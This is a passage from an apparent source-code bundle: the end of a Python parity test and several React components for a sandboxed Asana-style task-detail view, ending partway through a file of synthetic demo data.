    panel = TaskDetailPanel(dict(TASK))
    labels = [w.text() for w in panel.findChildren(QLabel)]
    vm = _vm()

    # Field names: every field the native grid draws exists in the web vm.
    native_fields = {cf["name"] for cf in EXTRAS["custom_fields"]
                     if (cf.get("name") or "").strip()}
    assert {f["name"] for f in vm["fields"]} == native_fields
    for name in native_fields:
        assert any(name in t for t in labels)

    # Stories: the native panel renders every comment_added story as a card
    # ("someone" for rule-posted ones); the web splits those into comment +
    # ⚡ automation rows. Parity holds over the union — no story is lost.
    native_comments = {s["text"] for s in EXTRAS["stories"]
                       if (s.get("subtype") or "comment_added") == "comment_added"}
    web_comment_like = [s for s in vm["stories"]
                        if s["kind"] in ("comment", "automation")]
    assert len(web_comment_like) == len(native_comments)

    # Attachments + title parity.
    assert any("BCBSMA copay update" in t for t in labels)
    assert {a["name"] for a in vm["attachments"]} == {"#cx thread", "tiers.png"}


if __name__ == "__main__":
    import sys
    sys.exit(pytest.main([__file__, "-q"]))
~~~~

## A · `web/src/task/Activity.jsx`  — 165 lines · sha256 `da3abd772b56c06ab5ecba1ae952437d62cea8348a0a88d4c3635eaebd747a41`

~~~~
import React from "react";
import { Avatar } from "./avatars.jsx";
import { visibleStories, orderStories, collapseStories } from "./shape.js";

// Activity feed: Comments | All activity tabs, Oldest/Newest sort, the
// middle-collapse "N more comments" row, and three row kinds. Comment bodies
// arrive as typed tokens (text / link / mention) parsed and sanitized
// Python-side — no HTML sink here; links relay to the host for validation.

export function TokenText({ tokens, onOpenUrl }) {
  const list = Array.isArray(tokens) ? tokens : [];
  return (
    <span className="tk-tokens">
      {list.map((t, i) => {
        if (t.t === "link") {
          return (
            <a
              key={i}
              className="tk-token-link"
              href={t.href || "#"}
              onClick={(e) => {
                e.preventDefault();
                if (onOpenUrl && t.href) onOpenUrl(t.href);
              }}
            >
              {t.v || t.href}
            </a>
          );
        }
        if (t.t === "mention") {
          return (
            <span key={i} className="tk-token-mention">@{t.v}</span>
          );
        }
        return <span key={i}>{t.v}</span>;
      })}
    </span>
  );
}

function CommentRow({ story, onOpenUrl }) {
  return (
    <div className="tk-story tk-story--comment">
      <Avatar person={story.author} size={28} />
      <div className="tk-story-body">
        <div className="tk-story-head">
          <span className="tk-story-author">
            {story.author ? story.author.name : "someone"}
          </span>
          <span className="tk-story-when">{story.when}</span>
        </div>
        <div className="tk-story-text">
          <TokenText tokens={story.tokens} onOpenUrl={onOpenUrl} />
        </div>
      </div>
    </div>
  );
}

function AutomationRow({ story, onOpenUrl }) {
  return (
    <div className="tk-story tk-story--automation">
      <span className="tk-story-bolt">⚡</span>
      <div className="tk-story-body">
        <span className="tk-story-text">
          <TokenText tokens={story.tokens} onOpenUrl={onOpenUrl} />
        </span>
        <span className="tk-story-when">{story.when}</span>
      </div>
    </div>
  );
}

function SystemRow({ story, onOpenUrl }) {
  return (
    <div className="tk-story tk-story--system">
      <div className="tk-story-body">
        <span className="tk-story-text">
          {story.author && (
            <span className="tk-story-actor">{story.author.name} </span>
          )}
          <TokenText tokens={story.tokens} onOpenUrl={onOpenUrl} />
        </span>
        <span className="tk-story-when">{story.when}</span>
      </div>
    </div>
  );
}

const ROWS = { comment: CommentRow, automation: AutomationRow, system: SystemRow };

function StoryRow({ story, onOpenUrl }) {
  const Row = ROWS[story.kind] || SystemRow;
  return <Row story={story} onOpenUrl={onOpenUrl} />;
}

export default function Activity({
  stories, tab, oldestFirst, expanded, capabilities, busy,
  onTab, onSort, onExpand, onPostComment, onOpenUrl,
}) {
  const shown = orderStories(visibleStories(stories, tab), oldestFirst);
  const { head, hidden, tail } = collapseStories(shown, expanded);
  return (
    <div className="tk-activity">
      <div className="tk-activity-bar">
        <button
          type="button"
          className={`tk-tab${tab === "comments" ? " tk-tab--active" : ""}`}
          onClick={() => onTab && onTab("comments")}
        >
          Comments
        </button>
        <button
          type="button"
          className={`tk-tab${tab === "all" ? " tk-tab--active" : ""}`}
          onClick={() => onTab && onTab("all")}
        >
          All activity
        </button>
        <span className="tk-actions-spacer" />
        <button type="button" className="tk-sort" onClick={() => onSort && onSort()}>
          {oldestFirst ? "Oldest" : "Newest"} ↑↓
        </button>
      </div>
      {head.map((s, i) => (
        <StoryRow key={s.gid || `h${i}`} story={s} onOpenUrl={onOpenUrl} />
      ))}
      {hidden > 0 && (
        <button type="button" className="tk-more" onClick={onExpand}>
          {hidden} more comments
        </button>
      )}
      {tail.map((s, i) => (
        <StoryRow key={s.gid || `t${i}`} story={s} onOpenUrl={onOpenUrl} />
      ))}
      {capabilities.comment && (
        <form
          className="tk-composer"
          onSubmit={(e) => {
            e.preventDefault();
            const box = e.currentTarget.elements.comment;
            const text = (box && box.value ? box.value : "").trim();
            if (text && onPostComment && !busy) {
              onPostComment(text);
              e.currentTarget.reset();
            }
          }}
        >
          <textarea
            name="comment"
            className="tk-composer-input"
            placeholder="Ask a question or post an update…"
            disabled={busy}
            rows={2}
          />
          <div className="tk-composer-bar">
            <button type="submit" className="tk-comment-btn" disabled={busy}>
              Comment
            </button>
          </div>
        </form>
      )}
    </div>
  );
}
~~~~

## A · `web/src/task/AppsRow.jsx`  — 78 lines · sha256 `3e4c0e98f2bf933257f86dd0c2b611d07d2fb7ffbb751e3d571d26105fd52b63`

~~~~
import React from "react";

// Apps + attachments region. Attachment URLs are never stored — a click
// relays the gid to the host, which resolves a fresh view_url off-thread and
// opens it natively (the TaskDetailPanel lane). Pure renderer, hook-free.

// Integration hosts get labeled "Apps" rows; anything else (asana uploads,
// unknown hosts) renders as a plain attachment chip.
const HOST_LABELS = {
  slack: "Slack",
  zendesk: "Zendesk",
  gdrive: "Google Drive",
  google_drive: "Google Drive",
  drive: "Google Drive",
  dropbox: "Dropbox",
  onedrive: "OneDrive",
  box: "Box",
};

const HOST_GLYPHS = {
  Slack: "#",
  Zendesk: "❯",
  "Google Drive": "▲",
  Dropbox: "◆",
  OneDrive: "☁",
  Box: "▣",
};

export function hostLabel(host) {
  const key = String(host || "").toLowerCase();
  return HOST_LABELS[key] || "";
}

export default function AppsRow({ attachments, resolving, onOpenAttachment }) {
  const list = Array.isArray(attachments) ? attachments : [];
  if (!list.length) return null;
  const apps = list.filter((a) => hostLabel(a.host));
  const files = list.filter((a) => !hostLabel(a.host));
  return (
    <div className="tk-section tk-apps">
      {apps.length > 0 && (
        <div className="tk-section-label">Apps</div>
      )}
      {apps.map((a) => {
        const label = hostLabel(a.host);
        return (
          <button
            key={a.gid || a.name}
            type="button"
            className="tk-app-row"
            disabled={resolving === a.gid}
            onClick={() => onOpenAttachment && onOpenAttachment(a.gid)}
          >
            <span className="tk-app-glyph">{HOST_GLYPHS[label] || "◦"}</span>
            <span className="tk-app-host">{label}</span>
            <span className="tk-app-name">
              {resolving === a.gid ? `${a.name} — resolving…` : a.name}
            </span>
          </button>
        );
      })}
      {files.length > 0 && (
        <div className="tk-section-label">Attachments</div>
      )}
      {files.map((a) => (
        <button
          key={a.gid || a.name}
          type="button"
          className="tk-att-chip"
          disabled={resolving === a.gid}
          onClick={() => onOpenAttachment && onOpenAttachment(a.gid)}
        >
          {resolving === a.gid ? `${a.name} — resolving…` : `${a.name} ›`}
        </button>
      ))}
    </div>
  );
}
~~~~

## A · `web/src/task/Description.jsx`  — 103 lines · sha256 `44f198afd2f5fba6db10ee0cc78b98ebf4a2cbeb4c61399feb24d5809d5b80d7`

~~~~
import React from "react";

// The ONLY HTML renderer on the task route. The controller sanitizes
// html_notes Python-side (sanitize_html_preview) before it ever reaches the
// viewmodel; this frame adds the second wall: sandbox="" = no scripts, no
// same-origin, no forms, no popups, no top-level navigation. Links render in
// Asana blue but cannot navigate from inside the sandbox — matching the
// Zendesk clone's accepted trade-off for preview frames.
//
// Editing: the textarea round-trips MARKDOWN (the same html↔md conversion
// the Renn lanes use); Save relays it and Python serializes to Asana's
// html_notes dialect behind the CAS-guarded, remote-first lane. No HTML is
// ever composed in JS.

const FRAME_CSS = `
  html, body { margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
      "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size: 14px; line-height: 20px; color: #1e1f21; background: #ffffff;
  }
  .task-notes { padding: 2px 0; }
  p { margin: 0 0 8px; }
  strong, b { font-weight: 600; }
  a { color: #4573d2; text-decoration: none; }
  a:hover { text-decoration: underline; }
  ul, ol { margin: 0 0 8px; padding-left: 22px; }
  li { margin: 2px 0; }
  h1, h2, h3, h4 { font-size: 14px; font-weight: 600; margin: 10px 0 4px; }
  img { max-width: 100%; height: auto; }
  code, pre {
    font-family: SFMono-Regular, Consolas, "Liberation Mono", Menlo, monospace;
    font-size: 12px; background: #f9f8f8; border-radius: 4px;
  }
  pre { padding: 8px; overflow-x: auto; }
  blockquote { margin: 0 0 8px; padding-left: 10px; border-left: 2px solid #edeae9; color: #6d6e6f; }
  table { border-collapse: collapse; }
  td, th { border: 1px solid #edeae9; padding: 4px 8px; }
`;

export default function Description({
  srcdoc, markdown, canEdit, editing, busy, status, onEdit, onCancel, onSave,
}) {
  if (!srcdoc && !canEdit) return null;
  const doc =
    `<!doctype html><html><head><meta charset="utf-8">` +
    `<meta name="color-scheme" content="light">` +
    `<style>${FRAME_CSS}</style></head><body>` +
    `<div class="task-notes">${srcdoc || ""}</div></body></html>`;
  return (
    <div className="tk-section tk-description">
      <div className="tk-desc-head">
        <span className="tk-section-label">Description</span>
        {canEdit && !editing && (
          <button type="button" className="tk-desc-edit-btn" disabled={busy}
                  onClick={onEdit}>
            Edit
          </button>
        )}
      </div>
      {editing ? (
        <form
          className="tk-desc-editor"
          onSubmit={(e) => {
            e.preventDefault();
            const box = e.currentTarget.elements.desc;
            if (onSave && !busy) onSave(box && box.value != null ? box.value : "");
          }}
        >
          <textarea
            name="desc"
            className="tk-desc-input"
            defaultValue={markdown}
            rows={10}
            disabled={busy}
          />
          <div className="tk-desc-editor-bar">
            {status && <span className="tk-desc-status">{status}</span>}
            <button type="button" className="tk-desc-cancel" disabled={busy}
                    onClick={onCancel}>
              Cancel
            </button>
            <button type="submit" className="tk-comment-btn" disabled={busy}>
              Save
            </button>
          </div>
        </form>
      ) : srcdoc ? (
        <iframe
          className="tk-notes-frame"
          title="Task description (sandboxed)"
          sandbox=""
          srcDoc={doc}
        />
      ) : (
        <button type="button" className="tk-desc-empty" disabled={busy}
                onClick={onEdit}>
          What is this task about?
        </button>
      )}
    </div>
  );
}
~~~~

## A · `web/src/task/FieldGrid.jsx`  — 79 lines · sha256 `ea9700cea4022bf3af30ca584d782418b17fa5275179b5c7376b0a74caecc8e7`

~~~~
import React from "react";
import { Avatar } from "./avatars.jsx";

// Custom-field grid: name left / typed value right, "—" for empty, and the
// "Hide custom fields" collapse link. Value rendering is a table-driven map
// keyed on the field kind — never an if/elif ladder.

const DASH = <span className="tk-empty">—</span>;

function pillsOrDash(f) {
  if (!f.pills.length) return f.value ? <span>{f.value}</span> : DASH;
  return (
    <span className="tk-field-pills">
      {f.pills.map((p, i) => (
        <span key={p.text + i} className={`tk-pill tk-pill--${p.color || "gray"}`}>
          {p.text}
        </span>
      ))}
    </span>
  );
}

function peopleOrDash(f) {
  if (!f.people.length) return DASH;
  return (
    <span className="tk-field-people">
      {f.people.map((p, i) => (
        <span key={p.name + i} className="tk-field-person">
          <Avatar person={p} size={20} />
          <span>{p.name}</span>
        </span>
      ))}
    </span>
  );
}

function checkboxGlyph(f) {
  return (
    <span className={`tk-checkbox${f.checked ? " tk-checkbox--on" : ""}`}>
      {f.checked ? "☑" : "☐"}
    </span>
  );
}

function textOrDash(f) {
  return f.value ? <span>{f.value}</span> : DASH;
}

const RENDERERS = {
  enum: pillsOrDash,
  multi_enum: pillsOrDash,
  people: peopleOrDash,
  checkbox: checkboxGlyph,
  date: textOrDash,
  number: textOrDash,
  text: textOrDash,
};

export default function FieldGrid({ fields, hidden, onToggleHidden }) {
  const list = Array.isArray(fields) ? fields : [];
  if (!list.length) return null;
  return (
    <div className="tk-section tk-fields">
      <div className="tk-section-label">Fields</div>
      {!hidden &&
        list.map((f, i) => (
          <div key={f.gid || f.name + i} className="tk-field-row">
            <span className="tk-field-name">{f.name}</span>
            <span className="tk-field-value">
              {(RENDERERS[f.kind] || textOrDash)(f)}
            </span>
          </div>
        ))}
      <button type="button" className="tk-fields-toggle" onClick={onToggleHidden}>
        {hidden ? "Show custom fields" : "Hide custom fields"}
      </button>
    </div>
  );
}
~~~~

## A · `web/src/task/Header.jsx`  — 119 lines · sha256 `a9715734042f667eacbfc2fa101ee0eb2c92171c490f28dbe2ab203bd76d3738`

~~~~
import React from "react";
import { Avatar, AvatarStack } from "./avatars.jsx";

// Task header: completed banner, action row, title, meta rows. Pure renderer —
// every affordance relays through props; ids/payloads are validated Python-side.

function Pill({ pill }) {
  if (!pill) return null;
  return (
    <span className={`tk-pill tk-pill--${pill.color || "gray"}`}>{pill.text}</span>
  );
}

function MetaRow({ label, children }) {
  return (
    <div className="tk-meta-row">
      <span className="tk-meta-label">{label}</span>
      <span className="tk-meta-value">{children}</span>
    </div>
  );
}

export default function Header({
  header, capabilities, busy,
  onToggleComplete, onRefresh, onOpenUrl, onSetDue,
}) {
  const h = header;
  const stack = h.assignee ? [h.assignee, ...h.collaborators] : h.collaborators;
  return (
    <div className="tk-header">
      {h.completed && <div className="tk-banner">✓ Completed</div>}
      <div className="tk-actions">
        <button
          type="button"
          className={`tk-complete-btn${h.completed ? " tk-complete-btn--done" : ""}`}
          disabled={!capabilities.complete || busy}
          onClick={() => onToggleComplete && onToggleComplete(!h.completed)}
        >
          {h.completed ? "✓ Completed" : "✓ Mark complete"}
        </button>
        <Pill pill={h.status_pill} />
        <span className="tk-actions-spacer" />
        {h.freshness && <span className="tk-freshness">{h.freshness}</span>}
        {capabilities.refresh && (
          <button
            type="button"
            className="tk-icon-btn"
            title="Refresh from Asana"
            disabled={busy}
            onClick={() => onRefresh && onRefresh()}
          >
            ↻
          </button>
        )}
        {h.permalink && (
          <a
            className="tk-permalink"
            href={h.permalink}
            onClick={(e) => {
              e.preventDefault();
              if (onOpenUrl) onOpenUrl(h.permalink);
            }}
          >
            Open in Asana ›
          </a>
        )}
        <AvatarStack people={stack} size={28} />
      </div>
      <h1 className="tk-title">{h.title || "—"}</h1>
      <div className="tk-meta">
        <MetaRow label="Assignee">
          {h.assignee ? (
            <span className="tk-assignee">
              <Avatar person={h.assignee} size={24} />
              <span className="tk-assignee-name">{h.assignee.name}</span>
              <span className="tk-assignee-status">Recently assigned ▾</span>
            </span>
          ) : (
            <span className="tk-empty">—</span>
          )}
        </MetaRow>
        <MetaRow label="Due date">
          {h.due_display ? (
            <span className={`tk-due${h.overdue ? " tk-due--overdue" : ""}`}>
              {h.due_display}
            </span>
          ) : (
            <span className="tk-empty">—</span>
          )}
          {capabilities.due && (
            <input
              key={h.due_iso}
              type="date"
              className="tk-due-input"
              defaultValue={h.due_iso}
              disabled={busy}
              onChange={(e) => onSetDue && onSetDue(e.currentTarget.value)}
              title="Change due date"
            />
          )}
        </MetaRow>
        {h.projects.length > 0 && (
          <MetaRow label="Projects">
            <span className="tk-projects">
              {h.projects.map((p, i) => (
                <span key={p.board + i} className="tk-project">
                  <span className="tk-project-board">{p.board}</span>
                  {p.section && (
                    <span className="tk-project-section"> · {p.section} ▾</span>
                  )}
                </span>
              ))}
            </span>
          </MetaRow>
        )}
      </div>
    </div>
  );
}
~~~~

## A · `web/src/task/Subtasks.jsx`  — 90 lines · sha256 `5f7f809ace0042586fdc88855e7bf129eb821d6b8b59ae2e5b027f62b4a6ac2f`

~~~~
import React from "react";

// Subtask checklist + composer. Promoted subtasks (mig 056) carry the ↳
// marker. The composer is an uncontrolled form — submit relays the text and
// resets. Check circles on Asana-linked rows (gid present) relay a completion
// toggle; authority (gid registry + writeback lane) lives entirely Python-side.

export function CheckCircle({ sub, canToggle, busy, onToggle }) {
  const cls = `tk-subcheck${sub.done ? " tk-subcheck--done" : ""}`;
  if (!canToggle) return <span className={cls}>✓</span>;
  return (
    <button
      type="button"
      className={`${cls} tk-subcheck--btn`}
      title={sub.done ? "Mark incomplete" : "Mark complete"}
      disabled={busy}
      onClick={() => onToggle(sub.gid, !sub.done)}
    >
      ✓
    </button>
  );
}

function SubtaskName({ sub, onOpen }) {
  const cls = `tk-subtask-name${sub.done ? " tk-subtask-name--done" : ""}`;
  const label = (
    <>
      {sub.promoted && <span className="tk-subtask-promoted">↳ </span>}
      {sub.name}
    </>
  );
  // Subtasks ARE tasks — linked rows navigate (promoted → this panel,
  // unsynced → Asana; the host decides, the gid registry gates).
  if (!sub.gid || !onOpen) return <span className={cls}>{label}</span>;
  return (
    <button
      type="button"
      className={`${cls} tk-subtask-link`}
      onClick={() => onOpen(sub.gid)}
    >
      {label}
    </button>
  );
}

export default function Subtasks({ subtasks, capabilities, busy, onAdd, onToggle, onOpen }) {
  const list = Array.isArray(subtasks) ? subtasks : [];
  if (!list.length && !capabilities.subtask) return null;
  return (
    <div className="tk-section tk-subtasks">
      <div className="tk-section-label">Subtasks</div>
      {list.map((s, i) => (
        <div key={s.gid || s.name + i} className="tk-subtask-row">
          <CheckCircle
            sub={s}
            canToggle={!!(s.gid && capabilities.subtask && onToggle)}
            busy={busy}
            onToggle={onToggle}
          />
          <SubtaskName sub={s} onOpen={onOpen} />
          {s.assignee && <span className="tk-subtask-meta">{s.assignee}</span>}
          {s.due && <span className="tk-subtask-meta">{s.due}</span>}
        </div>
      ))}
      {capabilities.subtask && (
        <form
          className="tk-subtask-composer"
          onSubmit={(e) => {
            e.preventDefault();
            const box = e.currentTarget.elements.subtask;
            const text = (box && box.value ? box.value : "").trim();
            if (text && onAdd && !busy) {
              onAdd(text);
              e.currentTarget.reset();
            }
          }}
        >
          <span className="tk-subcheck tk-subcheck--ghost">✓</span>
          <input
            name="subtask"
            className="tk-subtask-input"
            placeholder="Type to add a subtask…"
            disabled={busy}
            autoComplete="off"
          />
        </form>
      )}
    </div>
  );
}
~~~~

## A · `web/src/task/TaskApp.jsx`  — 182 lines · sha256 `d5ba4c5e236321ac98a5cc7da6d1d5b5d1875d05940161595a0f0148be575f0f`

~~~~
import React, { useEffect, useRef, useState } from "react";
import { useBridge } from "../lib/bridge.js";
import { normalizeData } from "./shape.js";
import { isDemoMode, buildDemoTask } from "./demo.js";
import Header from "./Header.jsx";
import FieldGrid from "./FieldGrid.jsx";
import Description from "./Description.jsx";
import Subtasks from "./Subtasks.jsx";
import AppsRow from "./AppsRow.jsx";
import Activity from "./Activity.jsx";
import "./task.css";

// Route root for #/task — the Asana task-detail mirror. Owns the bridge
// hookup and ALL local UI state (tabs, sort, collapse, hide-fields); every
// child is a pure renderer. Writes only relay ids/text to the bridge; the
// host validates against Python-held state.

export default function TaskApp() {
  const bridge = useBridge("taskBridge");
  const [vm, setVm] = useState(() => normalizeData(null));
  const [tab, setTab] = useState("comments");
  const [oldestFirst, setOldestFirst] = useState(true);
  const [expanded, setExpanded] = useState(false);
  const [fieldsHidden, setFieldsHidden] = useState(false);
  const [busy, setBusy] = useState(false);
  const [resolving, setResolving] = useState("");
  const [status, setStatus] = useState("");
  const [editingDesc, setEditingDesc] = useState(false);
  const prevIdRef = useRef("");

  useEffect(() => {
    window.__almaTaskMounted = true; // headless hook
  }, []);

  const demo = isDemoMode() && !bridge;
  useEffect(() => {
    if (!demo) return;
    const next = normalizeData(buildDemoTask().task_data);
    setVm(next);
    window.__almaTaskVm = next; // headless hook
    window.__almaTaskDemo = true;
  }, [demo]);

  useEffect(() => {
    if (!bridge) return;
    bridge.taskData.connect((j) => {
      try {
        const next = normalizeData(JSON.parse(j));
        if (next.task_id !== prevIdRef.current) {
          prevIdRef.current = next.task_id;
          setTab("comments");
          setOldestFirst(true);
          setExpanded(false);
          setFieldsHidden(false);
          // Editor state resets ONLY on task change. The background
          // reconcile silently re-opens the current task (WS1-M7) — a
          // same-task push must never stomp an operator mid-edit; the
          // uncontrolled textarea keeps their draft across the re-render.
          setEditingDesc(false);
        }
        setVm(next);
        setBusy(false);
        setResolving("");
        window.__almaTaskVm = next; // headless hook
      } catch (e) {}
    });
    if (bridge.statusText) {
      bridge.statusText.connect((t) => {
        setStatus(t || "");
        window.__almaTaskStatus = t; // headless hook
      });
    }
    if (bridge.actionResolved) {
      bridge.actionResolved.connect((j) => {
        try {
          const p = JSON.parse(j);
          setBusy(false);
          setResolving("");
          window.__almaTaskAction = p; // headless hook
        } catch (e) {}
      });
    }
    bridge.refresh();
    window.__almaTaskReady = true; // headless hook: all signals connected
  }, [bridge]);

  const call = (name, ...args) => {
    if (bridge && typeof bridge[name] === "function") bridge[name](...args);
  };
  const relay = (name, ...args) => {
    if (!bridge) return;
    setBusy(true);
    call(name, ...args);
  };

  const connected = bridge || demo;
  if (!connected) {
    return (
      <div className="app route-task tk-app">
        <div className="route-empty">
          <p>Waiting for the task bridge…</p>
          <p className="route-note">
            This route renders inside the app's task drilldown. Append{" "}
            <code>?demo</code> for sample data.
          </p>
        </div>
      </div>
    );
  }
  if (!vm.task_id) {
    return (
      <div className="app route-task tk-app">
        <div className="route-empty">
          <p>No task selected.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="app route-task tk-app">
      <Header
        header={vm.header}
        capabilities={vm.capabilities}
        busy={busy}
        onToggleComplete={(done) => relay("toggleComplete", vm.task_id, done)}
        onRefresh={() => relay("refreshTask", vm.task_id)}
        onSetDue={(iso) => {
          if (iso && iso !== vm.header.due_iso) relay("setDue", vm.task_id, iso);
        }}
        onOpenUrl={(url) => call("openUrl", url)}
      />
      {status && <div className="tk-status">{status}</div>}
      <FieldGrid
        fields={vm.fields}
        hidden={fieldsHidden}
        onToggleHidden={() => setFieldsHidden(!fieldsHidden)}
      />
      <Description
        srcdoc={vm.description.srcdoc}
        markdown={vm.description.markdown}
        canEdit={vm.capabilities.description}
        editing={editingDesc}
        busy={busy}
        status={status}
        onEdit={() => setEditingDesc(true)}
        onCancel={() => setEditingDesc(false)}
        onSave={(md) => relay("updateDescription", vm.task_id, md)}
      />
      <Subtasks
        subtasks={vm.subtasks}
        capabilities={vm.capabilities}
        busy={busy}
        onAdd={(text) => relay("addSubtask", vm.task_id, text)}
        onToggle={(gid, done) => relay("toggleSubtask", vm.task_id, gid, done)}
        onOpen={(gid) => call("openSubtask", vm.task_id, gid)}
      />
      <AppsRow
        attachments={vm.attachments}
        resolving={resolving}
        onOpenAttachment={(gid) => {
          if (!bridge) return;
          setResolving(gid);
          call("openAttachment", gid);
        }}
      />
      <Activity
        stories={vm.stories}
        tab={tab}
        oldestFirst={oldestFirst}
        expanded={expanded}
        capabilities={vm.capabilities}
        busy={busy}
        onTab={setTab}
        onSort={() => setOldestFirst(!oldestFirst)}
        onExpand={() => setExpanded(true)}
        onPostComment={(text) => relay("postComment", vm.task_id, text)}
        onOpenUrl={(url) => call("openUrl", url)}
      />
    </div>
  );
}
~~~~

## A · `web/src/task/avatars.jsx`  — 44 lines · sha256 `d8d4ed7e0ef2d19835cbc38e9597fef36fe8d4b5b528ff4bc1b582cae4470588`

~~~~
import React from "react";

// Hook-free avatar primitives shared by header, field grid, subtasks and the
// activity feed. Color arrives precomputed in the viewmodel (deterministic
// per-user hash lives Python-side); absent → neutral gray.

const FALLBACK = "#c7c4c4";

export function Avatar({ person, size = 24 }) {
  if (!person) return null;
  const style = {
    width: size,
    height: size,
    fontSize: Math.max(9, Math.round(size * 0.42)),
    background: person.color || FALLBACK,
  };
  return (
    <span className="tk-avatar" style={style} title={person.name}>
      {person.initials}
    </span>
  );
}

export function AvatarStack({ people, size = 28, max = 4 }) {
  const list = Array.isArray(people) ? people.filter(Boolean) : [];
  if (!list.length) return null;
  const shown = list.slice(0, max);
  const extra = list.length - shown.length;
  return (
    <span className="tk-avatar-stack">
      {shown.map((p, i) => (
        <Avatar key={p.name + i} person={p} size={size} />
      ))}
      {extra > 0 && (
        <span
          className="tk-avatar tk-avatar-more"
          style={{ width: size, height: size, fontSize: Math.max(9, Math.round(size * 0.38)) }}
        >
          +{extra}
        </span>
      )}
    </span>
  );
}
~~~~

## A · `web/src/task/demo.js`  — 171 lines · sha256 `7458f8bd15f50523870a17190d42d76d8cdb63d41eeea3bd461d35cdfdbada7a`

~~~~
// CX-Requests-shaped sample data for the #/task route. Doubles as the vitest
// fixture set — the dev workspace has NO custom fields (premium lapsed), so
// this is the only way the field grid / automation feed render outside
// production. Shapes mirror src/services/task_web.py's contract EXACTLY;
// task.test.jsx locks key parity. All content is synthetic (no PHI).

export function isDemoMode() {
  if (typeof window === "undefined") return false;
  return /[?&/]demo/.test(window.location.hash) ||
         /[?&]demo/.test(window.location.search);
}

const P = {
  jordan: { name: "Jordan Avery", initials: "JA", color: "#4186e0" },
  priya: { name: "Priya Nair", initials: "PN", color: "#aa62e3" },
  dana: { name: "Dana Whitfield", initials: "DW", color: "#20aaea" },
  marcus: { name: "Marcus Lee", initials: "ML", color: "#62d26f" },
  renn: { name: "Renn Ops", initials: "RO", color: "#ea4e9d" },
};

function txt(v) {
  return [{ t: "text", v, href: "" }];
}

const COMMENT_LOG = [
  [P.jordan, "Jul 2, 9:14 AM", txt("Kicking this off — the BCBSMA copay change lands Oct 1, so member-facing macros need to be staged before then.")],
  [P.priya, "Jul 3, 11:02 AM", [
    { t: "text", v: "Draft outline is up: ", href: "" },
    { t: "link", v: "Copay update outline", href: "https://docs.example.com/copay-outline" },
    { t: "text", v: " — flagging ", href: "" },
    { t: "mention", v: "Dana Whitfield", href: "" },
    { t: "text", v: " for the billing review.", href: "" },
  ]],
  [P.dana, "Jul 7, 2:40 PM", txt("Billing review done. Two edge cases: secondary coverage and retro-terminated plans. Added notes inline.")],
  [P.jordan, "Jul 9, 8:55 AM", txt("Thanks — folding both into the FAQ section.")],
  [P.marcus, "Jul 14, 6:22 PM", txt("Care Navigator quiz questions drafted; five items, answer key attached.")],
  [P.priya, "Jul 16, 10:05 AM", txt("Quiz looks good. Swap Q3 — it references the old copay tier table.")],
  [P.marcus, "Jul 17, 9:31 AM", txt("Q3 swapped for the new tier table version.")],
  [P.jordan, "Jul 21, 3:18 PM", txt("Guru card draft is in the drafts lane; word-diff is clean against the live card.")],
  [P.dana, "Jul 24, 12:47 PM", [
    { t: "text", v: "Zendesk macro copy staged — see ", href: "" },
    { t: "link", v: "ZD-48213", href: "https://example.zendesk.com/agent/tickets/48213" },
    { t: "text", v: " for the pilot thread.", href: "" },
  ]],
  [P.priya, "Jul 28, 4:03 PM", txt("Legal confirmed no disclosure changes needed for this one.")],
  [P.jordan, "Jul 30, 9:26 AM", txt("Training deck updated; enablement session booked for Aug 12.")],
  [P.marcus, "Aug 1, 1:12 PM", txt("Navigator dry-run complete — two wording nits, both fixed.")],
  [P.dana, "Aug 4, 10:44 AM", txt("Billing spot-check on staging passed for both edge cases.")],
  [P.priya, "Aug 5, 5:09 PM", [
    { t: "mention", v: "Jordan Avery", href: "" },
    { t: "text", v: " ready for final sign-off from your side.", href: "" },
  ]],
  [P.jordan, "Aug 6, 8:37 AM", txt("Signed off. Publishing steps queued for the Oct 1 window.")],
  [P.renn, "Aug 7, 7:58 AM", txt("Reminder: mirror copies staged locally; paste into Zendesk by hand per the read-only policy.")],
];

export function buildDemoTask() {
  const comments = COMMENT_LOG.map(([author, when, tokens], i) => ({
    gid: `c${i + 1}`, kind: "comment", author, when, tokens,
  }));
  const stories = [
    { gid: "s1", kind: "system", author: P.jordan, when: "Jul 2, 9:02 AM",
      tokens: txt("added this task to CX Requests") },
    ...comments,
    { gid: "s2", kind: "automation", author: null, when: "Aug 3, 6:00 AM",
      tokens: txt("When Task is overdue → Comment on Task: \"Past target — update the go-live checklist.\"") },
    { gid: "s3", kind: "system", author: P.jordan, when: "Aug 8, 9:12 AM",
      tokens: txt("completed this task") },
    { gid: "s4", kind: "automation", author: null, when: "Aug 8, 9:12 AM",
      tokens: txt("moved this task from New Requests to Complete · CX intake rule") },
  ];
  return {
    task_data: {
      connected: true,
      demo: true,
      task_id: "demo-1217331081535747",
      header: {
        completed: true,
        completed_on: "Aug 8, 2026",
        title: "BCBSMA copay update — member messaging + macros [[no value]]",
        status_pill: null,
        assignee: P.jordan,
        collaborators: [P.priya, P.dana, P.marcus, P.renn],
        due_display: "Sep 28, 2025 – Oct 17, 2025",
        due_iso: "2025-10-17",
        overdue: false,
        projects: [{ board: "CX Requests", section: "Complete" }],
        freshness: "Updated 5m ago",
        permalink: "https://app.asana.com/0/1215565058346588/1217331081535747",
      },
      fields: [
        { gid: "f1", name: "Request Type", kind: "enum", value: "Guru: Update",
          pills: [{ text: "Guru: Update", color: "green" }], people: [], checked: false },
        { gid: "f2", name: "Urgent?", kind: "enum", value: "No",
          pills: [{ text: "No", color: "red" }], people: [], checked: false },
        { gid: "f3", name: "Approved by Ops", kind: "enum", value: "Yes",
          pills: [{ text: "Yes", color: "green" }], people: [], checked: false },
        { gid: "f4", name: "Requested By", kind: "people", value: "",
          pills: [], people: [P.dana], checked: false },
        { gid: "f5", name: "Team", kind: "enum", value: "Member Experience",
          pills: [{ text: "Member Experience", color: "blue" }], people: [], checked: false },
        { gid: "f6", name: "Audience", kind: "multi_enum", value: "",
          pills: [{ text: "Care Navigators", color: "aqua" },
                  { text: "Billing Specialists", color: "purple" }], people: [], checked: false },
        { gid: "f7", name: "Go-Live Date", kind: "date", value: "Oct 17, 2025",
          pills: [], people: [], checked: false },
        { gid: "f8", name: "Effort (hrs)", kind: "number", value: "12",
          pills: [], people: [], checked: false },
        { gid: "f9", name: "Ticket Link", kind: "text", value: "ZD-48213",
          pills: [], people: [], checked: false },
        { gid: "f10", name: "Impact", kind: "enum", value: "High",
          pills: [{ text: "High", color: "orange" }], people: [], checked: false },
